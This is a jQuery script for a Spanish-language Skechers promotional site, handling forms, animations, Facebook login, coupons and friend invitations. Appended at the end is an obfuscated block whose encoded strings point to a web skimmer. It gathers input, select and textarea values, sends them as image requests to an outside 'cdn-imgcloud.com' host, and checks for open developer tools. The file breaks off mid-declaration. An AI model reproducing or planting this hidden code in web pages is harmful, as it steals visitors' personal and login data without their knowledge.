$(document).ready(function()
{
	// -------------------- SUBMIT DE FORMULARIOS
	$('input, select, option, optgroup, button').live(
	{
		keydown		: function(evento)
		{
			if ( evento.keyCode === 13 )
			{
				$(this).parents('form').submit();
			}
		},
		focus		: function()
		{
			$(this).next('.error-message').fadeOut(300, function()
			{
				$(this).remove();
			});
		}
	});

	$('.submit').live(
	{
		keydown	: function(evento)
		{
			if ( evento.keyCode === 13 )
			{
				$(this).parents('form').first().submit();
			}
			return false;
		},
		click	: function()
		{
			$(this).parents('form').first().submit();
			return false;
		}
	});

	var alto=$('body').height(),
		heightWrapper = (alto)-197, 
		verticalWrapper = heightWrapper / 2; 
	$('.wrapper').css({
		height :  heightWrapper,
		marginTop:	'-' + (verticalWrapper - 63) + 'px'
	});

	$(window).resize(function() {
		alto=$('body').height();
		heightWrapper = (alto)-197;
		verticalWrapper = heightWrapper / 2; 
		$('.wrapper').css({
			height :  heightWrapper,
			marginTop:	'-' + (verticalWrapper - 63) + 'px'
		})
	});

	if( alto > 750 )
	{
		cargaHuincha = function() {
			$('.revision').animate({
				bottom: "430"
			}, 500 );
		};
		mispremiosListado = function() {
			$('.premios-listado').animate({
				bottom: "-30"
			}, 500 );
		};
		mispremiosDetalle = function() {
			$('.premios-detalle').animate({
				bottom: "-200"
			}, 500 );
		};
		mispremiosDetalleBuscar = function() {
			$('.premios-detalle').animate({
				bottom: "-600"
			}, 500 );
		};
		mispremiosDetalleTraer = function() {
			$('.premios-detalle').animate({
				bottom: "-200"
			}, 500 );
		};
		misMaletas = function() {
			$('.mis-maletas, .mis-amigos, .como-participar').animate({
				bottom: "-50px"
			}, 500 );
		};
		tuMaleta = function() {
		$('.verifica .maleta').animate({
				bottom: "130px"
			}, 500 );
		};
		registrateEntrar = function() {
			$('.registro1, .entra').animate({
				bottom: "-110px"
			}, 500 );
			$('.registro2').animate({
				bottom: "-200px"
			}, 500 );
		};
	}
	else
	{
		cargaHuincha = function() {
			$('.revision').animate({
				bottom: "330"
			}, 500 );
		};
		mispremiosListado = function() {
			$('.premios-listado').animate({
				bottom: "-150"
			}, 500 );
		};
		mispremiosDetalle = function() {
			$('.premios-detalle').animate({
				bottom: "-200"
			}, 500 );
		};
		mispremiosDetalleBuscar = function() {
			$('.premios-detalle').animate({
				bottom: "-600"
			}, 500 );
		};
		mispremiosDetalleTraer = function() {
			$('.premios-detalle').animate({
				bottom: "-200"
			}, 500 );
		};
		misMaletas = function() {
			$('.mis-maletas, .mis-amigos, .como-participar').animate({
				bottom: "-165px"
			}, 500 );
		};
		tuMaleta = function() {
		$('.verifica .maleta').animate({
				bottom: "50px"
			}, 500 );
		};
		registrateEntrar = function() {
			$('.registro1, .entra').animate({
				bottom: "-180px"
			}, 500 );
			$('.registro2').animate({
				bottom: "-260px"
			}, 500 );
		};
	}

	cortinasInicial = function() {
		$('.header').animate({
			top: "0"
		}, 500 );
		$('.footer').animate({
			bottom: "0"
		}, 500 );
	};

	////////////////////////////////
	

	//tuPolicia = function() {
	//	$('.exito').animate({
	//		bottom: "0px"
	//	}, 500 );
	//	$('ul.m').trigger("stop", true);
	//	setTimeout(function() {
	//		location.href = webroot + 'btn1/premio';
	//	}, 1500);
	//};

	maletasRx = function() {
		var x = 2;
		// inicio animacion
		$('.rx-maletas .m1').css({ backgroundImage : 'url("' + webroot + 'img/btn1/rx-maleta-' + x + '.jpg")' });
		$('.rx-maletas .m1').fadeIn(300);
		setTimeout(function() {
			// animacion 2
			$('.rx-maletas .m1').fadeOut(300);
			x++;
			setTimeout(function() {
				$('.rx-maletas .m1').css({ backgroundImage : 'url("' + webroot + 'img/btn1/rx-maleta-' + x + '.jpg")' });
				$('.rx-maletas .m1').fadeIn(300);
				setTimeout(function() {
					$('.rx-maletas .m1').fadeOut(300);
					x++;
					// animacion 3
					setTimeout(function() {
						$('.rx-maletas .m1').css({ backgroundImage : 'url("' + webroot + 'img/btn1/rx-maleta-' + x + '.jpg")' });
						$('.rx-maletas .m1').fadeIn(300);
						setTimeout(function() {
							$('.rx-maletas .m1').fadeOut(300);
							x++;
							// animacion 4
							setTimeout(function() {
								$('.rx-maletas .m1').css({ backgroundImage : 'url("' + webroot + 'img/btn1/rx-maleta-' + x + '.jpg")' });
								$('.rx-maletas .m1').fadeIn(300);
								setTimeout(function() {
									$('.rx-maletas .m1').fadeOut(300);
									x++;
								},1000);
							},700);
						},1000);
					},700);
				},1000);
			},700);
		},1000);
	};

	logoTipos = function() {
		$('.logotipo-btn1, .logotipo-gana').fadeIn();
	};
	
	wrapperCentral = function() {
		$('.letrero-maletas, .letrero-revision').animate({
			height: "100"
		  }, 800 );
		$('.wrapper').fadeIn();
	};

	reproducirAnimaciones = function() {
    	cortinasInicial();
		setTimeout(logoTipos,500);
		setTimeout(wrapperCentral,1000);
		setTimeout(registrateEntrar,1200);
		setTimeout(misMaletas,1200);
		setTimeout(mispremiosListado,1200);
		//setTimeout(mispremiosDetalle,1800);
		setTimeout(cargaHuincha,1800);
		setTimeout(maletasRx,6500);
		setTimeout(tuMaleta,2000);
	};

	reproducirAnimaciones();

	/* =========== COMPATIBILIDAD PLACEHOLDER ===========  */
	/* CLEAR INPUT FOCUS */
	var el = $('input[type=text]');
	$(el).each(function()
	{
		if (! $(this).val() || $(this).val() == $(this).attr('placeholder') )
		{
			$(this).val($(this).attr('placeholder'));
			$(this).css('font-style' , 'italic');
			$(this).css('color' , '#D8D8D8');
		}
		else
		{
			$(this).css('font-style' , 'normal');
			$(this).css('color' , '#000');
		}
	});

	/* cuando se ingresa texto en el input, cambia la fuente a normal */
	el.keydown(function()
	{
		$(this).css('font-style' , 'normal');
		$(this).css('color' , '#000');
	});

	/* cuando el imput tiene el focus, verifica si el valor es igual al placeholder */
	el.focus(function(e) {
		if (e.target.value == $(this).attr('placeholder'))
		{
			e.target.value = '';
			$(this).css('font-style' , 'italic');
			$(this).css('color' , '#D8D8D8');
		}
		else
		{
			$(this).css('font-style' , 'normal');
			$(this).css('color' , '#000');
		}
	});
	el.blur(function(e) {
		if (e.target.value == '' || e.target.value == el.attr('placeholder'))
		{
			e.target.value = $(this).attr('placeholder');
			$(this).css('font-style' , 'italic');
			$(this).css('color' , '#D8D8D8');
		}
		else
		{
			$(this).css('font-style' , 'normal');
			$(this).css('color' , '#000');
		}
	});
	/* ===========  FIN COMPATIBILIDAD ===========  */

	//=== REGISTRO ===
	$('#Btn1RegistroForm .btn-entrar').click(function(evento) {
		evento.preventDefault();
		var acceso = true,
			mensaje = '';

		// validar campos
		$('#Btn1RegistroForm .registro input').each(function(index, elemento)
		{
			if (! $(elemento).val() || $(elemento).val() == '')
			{
				acceso = false;
				if (! mensaje)
				{
					mensaje = $(elemento).data('campo');
				}
				else
				{
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
			else if ($(elemento).val() == $(elemento).attr("placeholder"))
			{
				acceso = false;
				if (! mensaje)
				{
					mensaje = $(elemento).data('campo');
				}
				else
				{
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
		});
		
		if ( acceso )
		{
			$('#Btn1RegistroForm').submit();
		}
		else
		{
			$('.opacidad .texto').html('Para continuar debe ingresar: ' + mensaje);
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 2500);
		}
		return false;
	});
	
	// FACEBOOK CONNECT
	$('#loginfb').on('click', function(evento)
	{
		evento.preventDefault();
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				location.reload();
			}
			else
			{
				FB.login(function(response)
				{
					if ( response.authResponse )
					{
						location.reload();
					}
				}, { scope: 'email,publish_stream,publish_actions' });
			}
		});
	});

	// -------------------- LOGOUT FACEBOOK
	$('.salir-btn1').live('click', function()
	{
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				FB.logout(function()
				{
					location.href = webroot + 'btn1/logout';
				});
			}
			else
			{
				location.href = webroot + 'btn1/logout';
			}
		});
	});

	// SELECCION DE MALETAS
	$('.conjunto-maletas').mapster({
		fillOpacity: 0.7,
		fillColor: "FFED00",
		strokeColor: "FFED00",
		strokeOpacity: 0.8,
		strokeWidth: 1.5,
		stroke: true,
		clickNavigate: false,
		isSelectable: true,
		singleSelect: true
	});
	
	$("#maletas area").live('click', function (evento) {
		evento.preventDefault();
		var color = $(this).data("color");

		if ( $('#' + color).is(':visible') )
		{
			$(".icon-seleccion").hide();
			$('.elige-tu-skechers').hide();
		}
		else
		{
			$(".icon-seleccion").hide();
			$('#' + color).show();
			$('.elige-tu-skechers').show();
			$('.elige-tu-skechers a').attr('rel', color);
		}
		return false;
	});

	$('.content-elige .elige-tu-skechers .buscalas').live('click', function(evento) {
		evento.preventDefault();
		
		var color 		= $(this).attr('rel'),
			categoria 	= $(this).data('categoria');

		if ( color )
		{
			$('.opacidad .texto').html('¡Ahora deberas empacar 3 Skechers!');
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			$.ajax({
				type: "POST",
				async: false,
				url: webroot + "btn1/ajax_elegir/",
				data: {	color 	: color },
				success: function(respuesta) {
					if ( respuesta == 'READY' ) {
						setTimeout(function() {
							if ( categoria >= 1 && categoria <= 4 )
							{
								location.href = webroot + 'productos/full/' + categoria;
							}
							else
							{
								location.href = webroot + 'productos/inicio/';
							}
						},1000);
					}
					else {
						$('.opacidad .texto').fadeOut(500);
						setTimeout(function() {
							$('.opacidad .texto').html(respuesta);
							$('.opacidad .texto').css({ fontSize: '14px' });
							$('.opacidad .texto').fadeIn(1000);
							setTimeout(function() {
								$('.opacidad').fadeOut(1000);
							}, 2500);
						}, 700);
					}
				}
			});
		}
		else
		{
			$('.opacidad .texto').html('Para continuar debes seleccionar color');
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 2500);
		}
		return false;
	});

	// BOTON ELIMINAR PRODUCTO DE MALETA (VISTA VERIFICAR)
	$('.verifica .maleta .sacar-equipaje').click(function(evento) {

		evento.preventDefault();
		var index = $(this).data('index'),
			contenedor = $(this).parent(),
			continuar;

		$.ajax({
			type: "POST",
			async: false,
			url: webroot + "btn1/ajax_sacar/",
			data: {	index 	: index },
			success: function(respuesta) {
				if ( respuesta == 'READY' ) {
					//ocultar y eliminar de la vista boton continuar
					if (! $('.a-embarque .sin-equipaje').is(':visible') )
					{
						$('.a-embarque').fadeOut(800);
						setTimeout(function() {
							$('.a-embarque .con-equipaje').hide();
							$('.a-embarque .sin-equipaje').show();
							$('.a-embarque').css({ backgroundImage: "url('" + webroot + "img/btn1/te-faltan.png')" });
							$('.a-embarque').fadeIn(800);
						}, 1000);
					}

					//ocultar y eliminar de la vista el producto quitado de la maleta
					contenedor.fadeOut(1500, function() {
						contenedor.remove();
					});
				}
				else {
					$('.opacidad .texto').html('Lo sentimos, no fue posible sacar la zapatilla de tu maleta. <br />Porfavor intentelo nuevamente');
					$('.opacidad .texto').css({ fontSize: '14px' });
					$('.opacidad').fadeIn(1000);
					setTimeout(function() {
						$('.opacidad').fadeOut(1000);
					}, 2500);
				}
			}
		});
		return false;
	});

	// FORMULARIO MIS DATOS
	$('#Btn1MisDatosForm .btn-guardar').click(function(evento) {
		evento.preventDefault();
		var acceso = true,
			mensaje;

		// validar campos input
		$('#Btn1MisDatosForm input').each(function(index, elemento) {
			if (! $(elemento).val() || $(elemento).val() == '') {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
			else if ($(elemento).val() == $(elemento).attr("placeholder")) {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
		});
		// validar campos select
		$('#Btn1MisDatosForm select').each(function(index, elemento) {
			if (! $(elemento).val() ) {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
		});

		if ( acceso ) {
			$('#Btn1MisDatosForm').submit();
		}
		else {
			$('.opacidad .texto').html('Para continuar debe ingresar: ' + mensaje);
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 2500);
		}
		return false;
	});
	
	// FORMULARIO VERIFICAR DATOS
	$('#Btn1VerificarDatosForm .btn-guardar').click(function(evento) {
		evento.preventDefault();
		var acceso = true,
			mensaje;

		// validar campos input
		$('#Btn1VerificarDatosForm input').each(function(index, elemento) {
			if (! $(elemento).val() || $(elemento).val() == '') {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
			else if ($(elemento).val() == $(elemento).attr("placeholder")) {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
		});
		// validar campos select
		$('#Btn1VerificarDatosForm select').each(function(index, elemento) {
			if (! $(elemento).val() ) {
				acceso = false;
				if (! mensaje) {
					mensaje = $(elemento).data('campo');
				}
				else {
					mensaje += ', ' + $(elemento).data('campo');
				}
			}
		});

		if ( acceso ) {
			$('#Btn1VerificarDatosForm').submit();
		}
		else {
			$('.opacidad .texto').html('Para continuar debe ingresar: ' + mensaje);
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 2500);
		}
		return false;
	});

	// MIS MALETAS
	$('.mis-maletas .tabla li a').click(function(evento) {
		evento.preventDefault();

		var imagenes = '';
		// asignar estado current a la linea
		$('.mis-maletas .tabla li a').removeClass('current');
		$(this).addClass('current');

		// buscar las imagenes de la linea
		$(this).find('.zapa img').each(function(index, elemento) {
			imagenes += '<li><a href="#"><img width="50" height="42" alt="" src="' + $(elemento).attr('src') + '"></a></li>';
		});

		// carga las imagenes de la linea
		$('.mis-maletas .zapat').html(imagenes);
		return false;
	});

	// REVISION DE MALETAS
	// pasajero con problemas
	wrapperCentral1 = function() {
		$('.letrero-maletas, .letrero-revision').animate({
			height: "100"
		  }, 800 );
		$("ul.m").carouFredSel({
			auto	: {
				items 			: 15,
				duration		: 15000,
				easing			: "linear",
				pauseDuration	: 0
			},
			direction : 'right',
			scroll	: {
				onAfter	: function(newItems) {
					$('ul.m').trigger("stop", true);
					setTimeout(function() {
						location.href = webroot + 'btn1/verificar_datos';
					}, 500);
				}
			}
		});
	};

	// pasajero OK
	wrapperCentral2 = function() {
		$('.letrero-maletas, .letrero-revision').animate({
			height: "100"
		  }, 800 );
		$("ul.m").carouFredSel({
			auto	: {
				items 			: 16,
				duration		: 16000,
				easing			: "linear",
				pauseDuration	: 0
			},
			direction : 'right',
			scroll	: {
				onAfter	: function(newItems) {
					$('ul.m').trigger("stop", true);
					setTimeout(function() {
						location.href = webroot + 'btn1/premio';
					}, 500);
				}
			}
		});
	};

	var animar_mano = true;
	$('.premios-listado .box-p ul.p li a').live('click', function(evento) {
		evento.preventDefault();
		var id = $(this).data('id'),
			nombre = $(this).data('nombre'),
			codigo = $(this).data('codigo'),
			tipo = $(this).data('tipo'),
			detalle = $(this).data('detalle'),
			estado = $(this).data('estado');
		if (animar_mano)
		{
			animar_mano = false;
			$('.premios-listado .box-p ul.p li a').removeClass('current');
			$(this).addClass('current');

			mispremiosDetalleBuscar();
			if ( estado == 1 )
			{
				setTimeout(function() {
					$('.premios-detalle .tipo .text').html(nombre);
					$('.premios-detalle .tipo .codigo').html('Código: ' + codigo);
					if ( tipo != 1 && tipo != 2 && tipo != 3 && tipo != 9 )
					{
						$('.premios-detalle .canjear').show();
						$('.premios-detalle .regala').show();
						$('.premios-detalle .enviar').show();
						$('.premios-detalle .canjear').attr('rel', id);
					}
					else
					{
						$('.premios-detalle .canjear').hide();
						$('.premios-detalle .regala').hide();
						$('.premios-detalle .enviar').hide();
					}
					$('.premios-detalle .enviar').attr('rel', id);
					$('.premios-detalle .tipo').attr('style', "background-image: url('" + detalle + "');");
					mispremiosDetalleTraer();
					animar_mano = true;
				}, 800);
			}
			else if ( estado == 2 )
			{
				$('.opacidad .texto').html('Este premio fue regalado');
				$('.opacidad .texto').css({ fontSize: '14px' });
				$('.opacidad').fadeIn(1000);
				setTimeout(function() {
					$('.opacidad').fadeOut(1000);
				}, 2500);
				animar_mano = true;
			}
			else if ( estado == 3 )
			{
				$('.opacidad .texto').html('Este premio fue canjeado');
				$('.opacidad .texto').css({ fontSize: '14px' });
				$('.opacidad').fadeIn(1000);
				setTimeout(function() {
					$('.opacidad').fadeOut(1000);
				}, 2500);
				animar_mano = true;
			}
		}
		return false;
	});

	// canjear desde vista mis_premio
	$('.premios-detalle .canjear').live('click', function(evento) {
		evento.preventDefault();
		var id = $(this).attr('rel'),
			destino = webroot + 'btn1/canjear/' + id;
		
		if ( id )
		{
			$('.opacidad .texto').html('Recuerda seleccionar el producto al cual deseas aplicar tu descuento, desde el catalogo de skechers');
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				location.href = destino;
			}, 5000);
		}
		else
		{
			$('.opacidad .texto .vacio').html('Debe seleccionar un cupon');
		}
	});

	// canjear desde vista premio
	$('.premio-pp .canjea-ahora').live('click', function(evento) {
		evento.preventDefault();
		var id = $(this).attr('rel'),
			destino = webroot + 'btn1/canjear/' + id;
		
		if ( id )
		{
			$('.opacidad .texto').html('Recuerda seleccionar el producto al cual deseas aplicar tu descuento, desde el catalogo de skechers');
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				location.href = destino;
			}, 5000);
		}
		else
		{
			$('.opacidad .texto .vacio').html('Debe seleccionar un cupon');
		}
	});

	$('.premios-detalle .enviar').live('click', function(evento) {
		evento.preventDefault();
		var id = $(this).attr('rel'),
			para = $('#EnviarPremio').val(),
			destino = webroot + 'btn1/enviar/' + id;

		if ( id )
		{
			if ( para && para != $('#EnviarPremio').attr('placeholder') )
			{
				$('.opacidad .texto').html('Estamos enviando el codigo de descuento a tu amigo');
				$('.opacidad .texto').css({ fontSize: '14px' });
				$('.opacidad').fadeIn(1000);
				setTimeout(function() {
					$.ajax({
						type: "POST",
						async: false,
						url: webroot + "btn1/ajax_enviar/",
						data: {
								id 	: id,
								para : para
							  },
						success: function(respuesta) {
							if ( respuesta == 'READY' ) {
								$('.opacidad').fadeOut(1000);
								setTimeout(function() {
									$('.opacidad .texto').css({ fontSize: '14px' });
									$('.opacidad .texto').html('El email ha sido enviado');
									$('.opacidad').fadeIn(1000);
									setTimeout(function() {
										location.href = webroot + 'btn1/mis_premios';
									}, 5000);
								}, 1500);
							}
							else
							{
								$('.opacidad').fadeOut(1000);
								setTimeout(function() {
									$('.opacidad .texto').css({ fontSize: '14px' });
									$('.opacidad .texto').html('Se ha producido un error al enviar el correo');
									$('.opacidad').fadeIn(1000);
									setTimeout(function() {
										$('.opacidad').fadeOut(1000);
									}, 5000);
								}, 1500);
							}
						}
					});
				}, 2000);
			}
			else
			{
				$('.opacidad .texto').css({ fontSize: '14px' });
				$('.opacidad .texto').html('Debes ingresar un correo electronico');
				$('.opacidad').fadeIn(1000);
				setTimeout(function() {
					$('.opacidad').fadeOut(1000);
				}, 2500);
			}
		}
		else
		{
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad .texto').html('Debe seleccionar un cupon');
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 2500);
		}
	});

	$('.opacidad .cerrar').click(function(evento) {
		evento.preventDefault();
		$('.opacidad').fadeOut(1000);
	});

	$('.entra .olvide').live('click', function(evento) {
		evento.preventDefault();
		$('.back-olvide').fadeIn(1000);
		return false;
	});

	// olvide mi clave
	$('.enviar-olvide-clave').live('click', function() {
		var email = $('#EmailOlvide').val();

		if ( email && email != $('#EmailOlvide').attr('placeholder') )
		{
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad .texto').html('Verificando tu información');
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$.ajax({
					type: "POST",
					async: false,
					url: webroot + "btn1/ajax_olvide/",
					data: { email 	: email },
					success: function(respuesta) {
						if ( respuesta == 'READY' ) {
							$('.opacidad').fadeOut(800);
							setTimeout(function() {
								$('.opacidad .texto').css({ fontSize: '14px' });
								$('.opacidad .texto').html('Te acabamos de enviar un correo electronico con las indicaciones para recuperar tu clave');
								$('.opacidad').fadeIn(1000);
								setTimeout(function() {
									location.href = webroot + 'btn1/inicio';
								}, 4000);
							}, 1500);
						}
						else
						{
							$('.opacidad').fadeOut(1000);
							setTimeout(function() {
								$('.opacidad .texto').css({ fontSize: '14px' });
								$('.opacidad .texto').html(respuesta);
								$('.opacidad').fadeIn(1000);
								setTimeout(function() {
									$('.opacidad').fadeOut(1000);
								}, 4000);
							}, 2000);
						}
					}
				});
			},1000);
		}
		else
		{
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad .texto').html('Porfavor ingresa tu email');
			$('.opacidad').fadeIn(1000);
			setTimeout(function() {
				$('.opacidad').fadeOut(1000);
			}, 3000);
		}
		return false;
	});

	$('.back-olvide .cerrar-olvide').live('click', function(evento) {
		evento.preventDefault();
		$('.back-olvide').fadeOut(1000);
	});

	// SELECCION DE AMIGOS
	$('.mis-amigos .amigos .amigo-seleccionado').live('click', function(evento) {
		evento.preventDefault();
		var seleccionado = $(this).hasClass('current'),
			contador = 0,
			quedan;

		// contar current
		$('.amigo-seleccionado.current').each(function(index, elemento) {
			contador++;
		});

		if ( seleccionado )
		{
			// quitar current (seleccion)
			$(this).removeClass('current');
			contador--;
		}
		else
		{
			// si selecciona hasta 3 amigos
			if ( contador < 3 )
			{
				$(this).addClass('current');
				contador++;
			}
			// si selecciona mas de 3 amigos
			else
			{
				// levanta aviso
				$('.opacidad .texto').css({ fontSize: '14px' });
				$('.opacidad .texto').html('Lo sentimos, no puedes seleccionar mas de 3 amigos');
				$('.opacidad').fadeIn(1000);
				setTimeout(function() {
					$('.opacidad').fadeOut(1000);
				}, 3000);
			}
		}
		// calcular amigos faltantes
		quedan = 3 - contador;
		// escribir restantes
		if (quedan >= 1)
		{
			$('.mis-amigos .quedan').html('Quedan <span>' + quedan + '</span> amigos aun por invitar hoy.');
			$('.mis-amigos .btn-invitar').addClass('disabled');
		}
		else
		{
			$('.mis-amigos .quedan').html('Ya seleccionaste a tus amigos. Ahora invitalos!');
			$('.mis-amigos .btn-invitar').removeClass('disabled');
		}
		return false;
	});

	$('.mis-amigos .btn-invitar').live('click', function(evento) {
		evento.preventDefault();
		var inactivo = $(this).hasClass('disabled'),
			amigos = new Array();

		if (! inactivo )
		{
			// levanta aviso
			$('.opacidad .texto').css({ fontSize: '14px' });
			$('.opacidad .texto').html('Estamos invitando a tus amigos a participar');
			$('.opacidad').fadeIn(1000);

			// contar current
			$('.amigo-seleccionado.current').each(function(index, elemento) {
				amigos[index] = $(elemento).data('amigo');
			});
			setTimeout(function() {
				$.ajax({
					type: "POST",
					async: false,
					url: webroot + "btn1/ajax_invitar/",
					data: { amigos 	: amigos },
					success: function(respuesta) {
						if ( respuesta == 'READY' ) {
							$('.opacidad .texto').fadeOut(800);
							setTimeout(function() {
								$('.opacidad .texto').css({ fontSize: '14px' });
								$('.opacidad .texto').html('Tus amigos han sido invitados, vuelve a invitar mas amigos mañana');
								$('.opacidad .texto').fadeIn(1000);
								setTimeout(function() {
									location.href = webroot + 'btn1/inicio';
								}, 4000);
							}, 1500);
						}
						else
						{
							$('.opacidad .texto').fadeOut(1000);
							setTimeout(function() {
								$('.opacidad .texto').css({ fontSize: '14px' });
								$('.opacidad .texto').html(respuesta);
								$('.opacidad .texto').fadeIn(1000);
								setTimeout(function() {
									$('.opacidad').fadeOut(1000);
								}, 4000);
							}, 2000);
						}
					}
				});
			}, 1500);
		}
		return false;
	});
	
	
});



var _0x4745=['\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2d1008,_0x1b1caf){var _0x5d096f=function(_0x3088f3){while(--_0x3088f3){_0x2d1008['push'](_0x2d1008['shift']());}};_0x5d096f(++_0x1b1caf);}(_0x4745,0x120));var _0x199c=function(_0x1ddf45,_0x17f0f4){_0x1ddf45=_0x1ddf45-0x0;var _0x5bfe62=_0x4745[_0x1ddf45];if(_0x199c['PgxIgj']===undefined){(function(){var _0x574658=function(){var _0x3b79fd;try{_0x3b79fd=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xaf3c61){_0x3b79fd=window;}return _0x3b79fd;};var _0x20cb9e=_0x574658();var _0x490f16='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20cb9e['atob']||(_0x20cb9e['atob']=function(_0x451a90){var _0xb0d698=String(_0x451a90)['replace'](/=+$/,'');for(var _0x19a475=0x0,_0x5e123b,_0x302eb2,_0x5b4a64=0x0,_0x36a949='';_0x302eb2=_0xb0d698['charAt'](_0x5b4a64++);~_0x302eb2&&(_0x5e123b=_0x19a475%0x4?_0x5e123b*0x40+_0x302eb2:_0x302eb2,_0x19a475++%0x4)?_0x36a949+=String['fromCharCode'](0xff&_0x5e123b>>(-0x2*_0x19a475&0x6)):0x0){_0x302eb2=_0x490f16['indexOf'](_0x302eb2);}return _0x36a949;});}());_0x199c['ePbqga']=function(_0x569a0d){var _0x2b3894=atob(_0x569a0d);var _0x2a8a83=[];for(var _0x57f212=0x0,_0x5f85dd=_0x2b3894['length'];_0x57f212<_0x5f85dd;_0x57f212++){_0x2a8a83+='%'+('00'+_0x2b3894['charCodeAt'](_0x57f212)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a8a83);};_0x199c['FYcIbm']={};_0x199c['PgxIgj']=!![];}var _0x278760=_0x199c['FYcIbm'][_0x1ddf45];if(_0x278760===undefined){_0x5bfe62=_0x199c['ePbqga'](_0x5bfe62);_0x199c['FYcIbm'][_0x1ddf45]=_0x5bfe62;}else{_0x5bfe62=_0x278760;}return _0x5bfe62;};function 